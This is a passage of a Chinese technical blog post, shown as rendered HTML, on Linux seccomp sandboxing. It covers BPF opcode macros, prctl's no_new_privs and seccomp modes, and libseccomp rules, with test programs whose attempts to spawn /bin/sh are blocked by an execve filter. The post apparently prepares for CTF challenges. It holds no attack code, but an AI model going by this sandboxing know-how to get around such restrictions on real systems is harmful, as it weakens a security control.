0xa0</span></span><br><span class="line"><span class="comment">/* alu/jmp fields */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_OP(code)    ((code) &amp; 0xf0)         <span class="comment">//&#x5F53;&#x64CD;&#x4F5C;&#x7801;&#x7C7B;&#x578B;&#x4E3A;ALU&#x65F6;&#xFF0C;&#x6307;&#x5B9A;&#x5177;&#x4F53;&#x8FD0;&#x7B97;&#x7B26;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_ADD		0x00                    <span class="comment">//&#x5230;&#x5E95;&#x6267;&#x884C;&#x4EC0;&#x4E48;&#x64CD;&#x4F5C;&#x53EF;&#x4EE5;&#x770B;filter.h&#x91CC;&#x9762;&#x7684;&#x5B9A;&#x4E49;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_SUB		0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_MUL		0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_DIV		0x30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_OR		0x40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_AND		0x50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_LSH		0x60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_RSH		0x70</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_NEG		0x80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_MOD		0x90</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_XOR		0xa0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_JA		0x00                    <span class="comment">//&#x5F53;&#x64CD;&#x4F5C;&#x7801;&#x7C7B;&#x578B;&#x662F;JMP&#x65F6;&#x6307;&#x5B9A;&#x8DF3;&#x8F6C;&#x7C7B;&#x578B;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_JEQ		0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_JGT		0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_JGE		0x30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_JSET        0x40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_SRC(code)   ((code) &amp; 0x08)         </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_K		0x00                    <span class="comment">//&#x5E38;&#x6570;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>		BPF_X		0x08</span></span><br></pre></td></tr></table></figure>
<h2 id="0x02-prctl&#x51FD;&#x6570;&#x8C03;&#x7528;"><a href="#0x02-prctl&#x51FD;&#x6570;&#x8C03;&#x7528;" class="headerlink" title="0x02 prctl&#x51FD;&#x6570;&#x8C03;&#x7528;"></a>0x02 prctl&#x51FD;&#x6570;&#x8C03;&#x7528;</h2><p>prctl&#x5C31;&#x662F;&#x5728;c&#x7A0B;&#x5E8F;&#x4E2D;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;BPF&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#x64CD;&#x4F5C;&#x8FDB;&#x7A0B;&#x7684;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x3002;&#x51FD;&#x6570;&#x539F;&#x578B;&#x5982;&#x4E0B;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span>;</span><br></pre></td></tr></table></figure>
<p>option&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x53EA;&#x5173;&#x6CE8;PR_SET_NO_NEW_PRIVS(38)&#x548C;PR_SET_SECCOMP</p>
<h3 id="PR-SET-NO-NEW-PRIVS&#xFF08;38&#xFF09;-since-Linux-3-5"><a href="#PR-SET-NO-NEW-PRIVS&#xFF08;38&#xFF09;-since-Linux-3-5" class="headerlink" title="PR_SET_NO_NEW_PRIVS&#xFF08;38&#xFF09; (since Linux 3.5)"></a>PR_SET_NO_NEW_PRIVS&#xFF08;38&#xFF09; (since Linux 3.5)</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PR_SET_NO_NEW_PRIVS&#xFF08;<span class="number">38</span>&#xFF09; (since Linux <span class="number">3.5</span>)</span><br><span class="line">              Set the calling thread&apos;s no_new_privs bit to the value in  arg2.</span><br><span class="line">              With  no_new_privs  <span class="built_in">set</span>  to  <span class="number">1</span>,  execve(<span class="number">2</span>) promises <span class="keyword">not</span> to grant</span><br><span class="line">              privileges to <span class="keyword">do</span> anything that could <span class="keyword">not</span> have been done  without</span><br><span class="line">              <span class="function">the  <span class="title">execve</span><span class="params">(<span class="number">2</span>)</span>  <span class="title">call</span> <span class="params">(<span class="keyword">for</span> example, rendering the <span class="built_in">set</span>-user-ID <span class="keyword">and</span></span></span></span><br><span class="line">              set-group-ID mode bits, and file  capabilities  non-functional).</span><br><span class="line">              Once  <span class="built_in">set</span>, <span class="keyword">this</span> bit cannot be unset.  The setting of <span class="keyword">this</span> bit is</span><br><span class="line">              inherited by children created by fork(2) and clone(2), and  pre&#x2010;</span><br><span class="line">              served across execve(2).</span><br></pre></td></tr></table></figure>
<p>PR_SET_NO_NEW_PRIVS&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x82E5;&#x8BBE;&#x7F6E;&#x4E3A;1&#xFF0C;&#x90A3;&#x4E48;&#x7A0B;&#x5E8F;&#x7EBF;&#x7A0B;&#x5C06;&#x4E0D;&#x80FD;&#x901A;&#x8FC7;&#x6267;&#x884C;execve&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x6765;&#x83B7;&#x5F97;&#x63D0;&#x6743;&#xFF0C;&#x8BE5;&#x9009;&#x9879;&#x53EA;&#x5BF9;execve&#x8FD9;&#x4E2A;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x6709;&#x6548;&#x3002;&#x610F;&#x601D;&#x5C31;&#x662F;&#x82E5;&#x4F60;&#x4F7F;&#x7528;syscall(59,&#x2019;/bin/sh&#x2019;,null,null)&#x6216;system(&#x201C;/bin/sh&#x201D;)&#xFF08;&#x5185;&#x90E8;&#x8FD8;&#x662F;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;execve&#xFF09;&#x83B7;&#x5F97;&#x7684;&#x7EBF;&#x7A0B;shell&#xFF0C;&#x7528;&#x6237;&#x7EC4;&#x4F9D;&#x7136;&#x662F;&#x4E4B;&#x524D;&#x7684;&#x7528;&#x6237;&#x7EC4;&#xFF0C;&#x4E14;&#x4E0D;&#x80FD;&#x83B7;&#x5F97;&#x66F4;&#x9AD8;&#x6743;&#x9650;&#x3002;</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line">$ whoami</span><br><span class="line">po1lux</span><br><span class="line">$ sudo su</span><br><span class="line">sudo: effective uid is not 0, is /usr/bin/sudo on a file system with the &apos;nosuid&apos; option set or an NFS file system without root privileges?</span><br></pre></td></tr></table></figure>
<h3 id="PR-SET-SECCOMP&#xFF08;22&#xFF09;"><a href="#PR-SET-SECCOMP&#xFF08;22&#xFF09;" class="headerlink" title="PR_SET_SECCOMP&#xFF08;22&#xFF09;"></a>PR_SET_SECCOMP&#xFF08;22&#xFF09;</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">PR_SET_SECCOMP (since Linux <span class="number">2.6</span><span class="number">.23</span>)</span><br><span class="line">   Set the secure computing (seccomp) mode for the calling  thread,</span><br><span class="line">   to limit the available system calls.  <span class="function">The more recent <span class="title">seccomp</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function">   system  call  provides  a  superset  of  the  functionality   of</span></span><br><span class="line">   PR_SET_SECCOMP.</span><br><span class="line"></span><br><span class="line">   The  seccomp  mode is selected via arg2.  (The seccomp constants</span><br><span class="line">   are defined in &lt;linux/seccomp.h&gt;.)</span><br><span class="line"></span><br><span class="line">   With arg2 <span class="built_in">set</span> to SECCOMP_MODE_STRICT, the only system calls that</span><br><span class="line">   the  thread is permitted to make are read(2), write(2), _exit(2)</span><br><span class="line">   (but not exit_group(2)), and sigreturn(2).  Other  system  calls</span><br><span class="line">   result  in  the  delivery  of  a  SIGKILL signal.  Strict secure</span><br><span class="line">   computing mode is useful <span class="keyword">for</span> number-crunching applications  that</span><br><span class="line">   may  need  to  execute  untrusted byte code, perhaps obtained by</span><br><span class="line">   reading from a pipe <span class="keyword">or</span> socket.  This operation is available only</span><br><span class="line">   <span class="keyword">if</span> the kernel is configured with CONFIG_SECCOMP enabled.</span><br><span class="line"></span><br><span class="line">   With  arg2  set  to  SECCOMP_MODE_FILTER  (since Linux 3.5), the</span><br><span class="line">   system calls allowed are defined by  a  pointer  to  a  Berkeley</span><br><span class="line">   Packet  Filter  passed  in  arg3.  This argument is a pointer to</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span>;</span> it can be designed to filter arbitrary system</span><br><span class="line">   calls <span class="keyword">and</span> system call arguments.  This mode is available only <span class="keyword">if</span></span><br><span class="line">   the kernel is configured with CONFIG_SECCOMP_FILTER enabled.</span><br><span class="line"></span><br><span class="line">   If SECCOMP_MODE_FILTER filters permit fork(2), then the  seccomp</span><br><span class="line">   <span class="function">mode  is  inherited by children created by <span class="title">fork</span><span class="params">(<span class="number">2</span>)</span></span>; <span class="function"><span class="keyword">if</span> <span class="title">execve</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line">   is  permitted,  then  the  seccomp  mode  is  preserved   across</span><br><span class="line">   execve(2).  If the filters permit prctl() calls, then additional</span><br><span class="line">   filters can be added; they are run in order until the first non-</span><br><span class="line">   allow result is seen.</span><br><span class="line"></span><br><span class="line">   For   further   information,   see   the   kernel   source  file</span><br><span class="line">   Documentation/prctl/seccomp_filter.txt.</span><br></pre></td></tr></table></figure>
<p>&#x5982;&#x679C;&#x53C2;&#x6570;2&#x4E3A;<code>SECCOMP_MODE_STRICT</code>(1),&#x5219;&#x53EA;&#x5141;&#x8BB8;&#x8C03;&#x7528;read,write,_exit(not exit_group),sigreturn&#x8FD9;&#x51E0;&#x4E2A;syscall.&#x5982;&#x679C;&#x53C2;&#x6570;2&#x4E3A;<code>SECCOMP_MODE_FILTER</code>(2),&#x5219;&#x4E3A;&#x8FC7;&#x6EE4;&#x6A21;&#x5F0F;,&#x5176;&#x4E2D;&#x5BF9;syscall&#x7684;&#x9650;&#x5236;&#x901A;&#x8FC7;&#x53C2;&#x6570;3&#x7684;&#x7ED3;&#x6784;&#x4F53;&#xFF0C;&#x6765;&#x81EA;&#x5B9A;&#x4E49;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#x3002;</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prctl(<span class="name">PR_SET_SECCOMP</span>,SECCOMP_MODE_FILTER,<span class="symbol">&amp;prog</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>&amp;prog&#x5F62;&#x5F0F;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> {</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span>		len;	<span class="comment">/* &#x6307;&#x4EE4;&#x4E2A;&#x6570; */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> *<span class="title">filter</span>;</span> <span class="comment">/*&#x6307;&#x5411;&#x5305;&#x542B;struct sock_filter&#x7684;&#x7ED3;&#x6784;&#x4F53;&#x6570;&#x7EC4;&#x6307;&#x9488;*/</span></span><br><span class="line">};</span><br></pre></td></tr></table></figure>
<p>&#x8FD9;&#x4E2A;filter&#x5C31;&#x662F;&#x6307;&#x5411;&#x5305;&#x542B;struct sock_filter&#x7684;&#x7ED3;&#x6784;&#x4F53;&#x6570;&#x7EC4;&#x6307;&#x9488;&#xFF0C;&#x6BD4;&#x5982;&#x4E0A;&#x8FF0;&#x7684;struct sock_filter filter[]&#x3002;</p>
<h3 id="&#x901A;&#x8FC7;&#x4F7F;&#x7528;ptrcl&#x7981;&#x7528;execve&#x7CFB;&#x7EDF;&#x8C03;&#x7528;"><a href="#&#x901A;&#x8FC7;&#x4F7F;&#x7528;ptrcl&#x7981;&#x7528;execve&#x7CFB;&#x7EDF;&#x8C03;&#x7528;" class="headerlink" title="&#x901A;&#x8FC7;&#x4F7F;&#x7528;ptrcl&#x7981;&#x7528;execve&#x7CFB;&#x7EDF;&#x8C03;&#x7528;"></a>&#x901A;&#x8FC7;&#x4F7F;&#x7528;ptrcl&#x7981;&#x7528;execve&#x7CFB;&#x7EDF;&#x8C03;&#x7528;</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] = {</span>                 </span><br><span class="line">	BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="number">0</span>),</span><br><span class="line">        BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="number">59</span>,<span class="number">0</span>,<span class="number">1</span>),</span><br><span class="line">        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span><br><span class="line">        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class="line">};</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> = {</span>                                    </span><br><span class="line">    len = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(<span class="keyword">sizeof</span>(filter)/<span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),<span class="comment">//&#x89C4;&#x5219;&#x6761;&#x6570;</span></span><br><span class="line">    filter = filter,                                         <span class="comment">//&#x7ED3;&#x6784;&#x4F53;&#x6570;&#x7EC4;&#x6307;&#x9488;</span></span><br><span class="line">};</span><br><span class="line">	prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);             <span class="comment">//&#x5FC5;&#x8981;&#x7684;&#xFF0C;&#x8BBE;&#x7F6E;NO_NEW_PRIVS</span></span><br><span class="line">	prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</span><br><span class="line">	write(<span class="number">0</span>,<span class="string">&quot;test\n&quot;</span>,<span class="number">5</span>);</span><br><span class="line">    	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<h2 id="0x03-seccomp&#x5E93;&#x51FD;&#x6570;-&#x548C;2019ByteCTF-VIP&#x590D;&#x73B0;&#x65E0;&#x5173;"><a href="#0x03-seccomp&#x5E93;&#x51FD;&#x6570;-&#x548C;2019ByteCTF-VIP&#x590D;&#x73B0;&#x65E0;&#x5173;" class="headerlink" title="0x03 seccomp&#x5E93;&#x51FD;&#x6570;(&#x548C;2019ByteCTF VIP&#x590D;&#x73B0;&#x65E0;&#x5173;)"></a>0x03 seccomp&#x5E93;&#x51FD;&#x6570;(&#x548C;2019ByteCTF VIP&#x590D;&#x73B0;&#x65E0;&#x5173;)</h2><p>&#x8FD9;&#x4E2A;&#x5E93;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;&#x4E00;&#x4E9B;&#x51FD;&#x6570;&#x5B9E;&#x73B0;prctl&#x7C7B;&#x4F3C;&#x7684;&#x6548;&#x679C;&#xFF0C;&#x5E93;&#x4E2D;&#x5C01;&#x88C5;&#x4E86;&#x4E00;&#x4E9B;&#x51FD;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0D;&#x7528;&#x4E86;&#x89E3;BPF&#x89C4;&#x5219;&#x800C;&#x5B9E;&#x73B0;&#x8FC7;&#x6EE4;&#x3002;</p>
<p>&#x4F46;&#x662F;&#x5728;c&#x7A0B;&#x5E8F;&#x4E2D;&#x4F7F;&#x7528;&#x5B83;&#xFF0C;&#x9700;&#x8981;&#x88C5;&#x4E00;&#x4E9B;&#x5E93;&#x6587;&#x4EF6;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libseccomp-dev libseccomp2 seccomp</span><br></pre></td></tr></table></figure>
<h3 id="&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x8BE5;&#x5E93;&#x7684;&#x51FD;&#x6570;&#x5B9E;&#x73B0;&#x7981;&#x7528;execve&#x7CFB;&#x7EDF;&#x8C03;&#x7528;"><a href="#&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x8BE5;&#x5E93;&#x7684;&#x51FD;&#x6570;&#x5B9E;&#x73B0;&#x7981;&#x7528;execve&#x7CFB;&#x7EDF;&#x8C03;&#x7528;" class="headerlink" title="&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x8BE5;&#x5E93;&#x7684;&#x51FD;&#x6570;&#x5B9E;&#x73B0;&#x7981;&#x7528;execve&#x7CFB;&#x7EDF;&#x8C03;&#x7528;"></a>&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x8BE5;&#x5E93;&#x7684;&#x51FD;&#x6570;&#x5B9E;&#x73B0;&#x7981;&#x7528;execve&#x7CFB;&#x7EDF;&#x8C03;&#x7528;</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc seccomptest.c -o seccomptest -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>{</span><br><span class="line">	scmp_filter_ctx ctx;</span><br><span class="line">	ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>);</span><br><span class="line">	seccomp_load(ctx);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> * str = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">&quot;i will give you a shell\n&quot;</span>,<span class="number">24</span>);</span><br><span class="line">	syscall(<span class="number">59</span>,str,<span class="literal">NULL</span>,<span class="literal">NULL</span>);<span class="comment">//execve</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>scmp_filter_ctx&#x662F;&#x8FC7;&#x6EE4;&#x5668;&#x7684;&#x7ED3;&#x6784;&#x4F53;<br>seccomp_init&#x5BF9;&#x7ED3;&#x6784;&#x4F53;&#x8FDB;&#x884C;&#x521D;&#x59CB;&#x5316;&#xFF0C;&#x82E5;&#x53C2;&#x6570;&#x4E3A;SCMP_ACT_ALLOW&#xFF0C;&#x5219;&#x8FC7;&#x6EE4;&#x4E3A;&#x9ED1;&#x540D;&#x5355;&#x6A21;&#x5F0F;&#xFF1B;&#x82E5;&#x4E3A;SCMP_ACT_KILL&#xFF0C;&#x5219;&#x4E3A;&#x767D;&#x540D;&#x5355;&#x6A21;&#x5F0F;&#xFF0C;&#x5373;&#x6CA1;&#x6709;&#x5339;&#x914D;&#x5230;&#x89C4;&#x5219;&#x7684;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x90FD;&#x4F1A;&#x6740;&#x6B7B;&#x8FDB;&#x7A0B;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E0D;&#x5141;&#x8BB8;&#x6240;&#x6709;&#x7684;syscall&#x3002;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp_init(<span class="keyword">uint32_t</span> def_action);</span><br></pre></td></tr></table></figure>
<p>def_action&#x4E3A;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * seccomp actions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Kill the process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_ACT_KILL		0x00000000U</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Throw a SIGSYS signal</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_ACT_TRAP		0x00030000U</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return the specified error code</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_ACT_ERRNO(x)	(0x00050000U | ((x) &amp; 0x0000ffffU))</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Notify a tracing process with the specified value</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_ACT_TRACE(x)	(0x7ff00000U | ((x) &amp; 0x0000ffffU))</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Allow the syscall to be executed after the action has been logged</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_ACT_LOG		0x7ffc0000U</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Allow the syscall to be executed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SCMP_ACT_ALLOW		0x7fff0000U</span></span><br></pre></td></tr></table></figure>
<p>seccomp_rule_add&#x662F;&#x6DFB;&#x52A0;&#x4E00;&#x6761;&#x89C4;&#x5219;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">seccomp_rule_add</span><span class="params">(scmp_filter_ctx ctx,</span></span></span><br><span class="line"><span class="function"><span class="params">		     <span class="keyword">uint32_t</span> action, <span class="keyword">int</span> syscall, <span class="keyword">unsigned</span> <span class="keyword">int</span> arg_cnt, ...)</span></span>;</span><br></pre></td></tr></table></figure>
<p>arg_cnt&#x8868;&#x660E;&#x662F;&#x5426;&#x9700;&#x8981;&#x5BF9;&#x5BF9;&#x5E94;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x7684;&#x53C2;&#x6570;&#x505A;&#x51FA;&#x9650;&#x5236;&#x4EE5;&#x53CA;&#x6307;&#x793A;&#x505A;&#x51FA;&#x9650;&#x5236;&#x7684;&#x4E2A;&#x6570;&#xFF0C;&#x5982;&#x679C;&#x4EC5;&#x4EC5;&#x9700;&#x8981;&#x5141;&#x8BB8;&#x6216;&#x8005;&#x7981;&#x6B62;&#x6240;&#x6709;&#x67D0;&#x4E2A;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#xFF0C;arg_cnt&#x76F4;&#x63A5;&#x4F20;&#x5165;0&#x5373;&#x53EF;&#xFF0C;seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0)&#x5373;&#x7981;&#x7528;execve&#xFF0C;&#x4E0D;&#x7BA1;&#x5176;&#x53C2;&#x6570;&#x5982;&#x4F55;&#x3002;</p>
<p>&#x5982;&#x679C;&#x8003;&#x8651;&#x5230;&#x66F4;&#x9AD8;&#x7684;&#x81EA;&#x5B9A;&#x4E49;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x53BB;&#x4E86;&#x89E3;&#x4E00;&#x4E0B;&#x5177;&#x4F53;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x7684;&#x53C2;&#x6570;&#x60C5;&#x51B5;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5229;&#x7528;SCMP_AX&#x53CA;SCMP_CMP_XX&#x7C7B;&#x7684;&#x5B8F;&#x5B9A;&#x4E49;&#x505A;&#x4E00;&#x4E9B;&#x8FC7;&#x6EE4;&#x3002;&#x4EE5;read&#x4E3A;&#x4F8B;&#xFF0C;read&#x51FD;&#x6570;&#x539F;&#x578B;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> read(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);</span><br></pre></td></tr></table></figure>
<p>&#x9650;&#x5236;&#x4ECE;&#x6807;&#x51C6;&#x8F93;&#x5165;stdin&#x8BFB;&#x5165;&#x7684;&#x5B57;&#x8282;&#x6570;&#x4E0D;&#x80FD;&#x4E3A;100&#x3002;</p>
